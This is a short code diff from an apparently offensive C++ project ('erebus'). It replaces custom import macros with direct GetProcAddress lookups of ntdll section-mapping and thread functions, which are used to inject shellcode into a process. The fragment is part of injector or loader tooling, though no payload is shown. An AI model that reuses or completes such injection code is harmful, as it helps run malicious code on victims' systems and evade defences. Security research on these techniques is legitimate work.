@@ -9,12 +9,13 @@ namespace erebus {
 		HANDLE section_handle;
 		LARGE_INTEGER section_size = { shellcode_size };
 
-		HMODULE ntdll = ImportModule("ntdll.dll");
-		ImportFunction(ntdll, NtCreateSection, typeNtCreateSection);
-		ImportFunction(ntdll, NtMapViewOfSection, typeNtMapViewOfSection);
-		ImportFunction(ntdll, NtUnmapViewOfSection, typeNtUnmapViewOfSection);
-		ImportFunction(ntdll, NtResumeThread, typeNtResumeThread);
-		ImportFunction(ntdll, NtClose, typeNtClose);
+		HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+		if (!ntdll) { LOG_ERROR("Failed to get ntdll.dll"); return; }
+		typeNtCreateSection NtCreateSection = (typeNtCreateSection)GetProcAddress(ntdll, "NtCreateSection");
+		typeNtMapViewOfSection NtMapViewOfSection = (typeNtMapViewOfSection)GetProcAddress(ntdll, "NtMapViewOfSection");
+		typeNtUnmapViewOfSection NtUnmapViewOfSection = (typeNtUnmapViewOfSection)GetProcAddress(ntdll, "NtUnmapViewOfSection");
+		typeNtResumeThread NtResumeThread = (typeNtResumeThread)GetProcAddress(ntdll, "NtResumeThread");
+		typeNtClose NtClose = (typeNtClose)GetProcAddress(ntdll, "NtClose");
 
 		NTSTATUS status = NtCreateSection(
 			&section_handle,
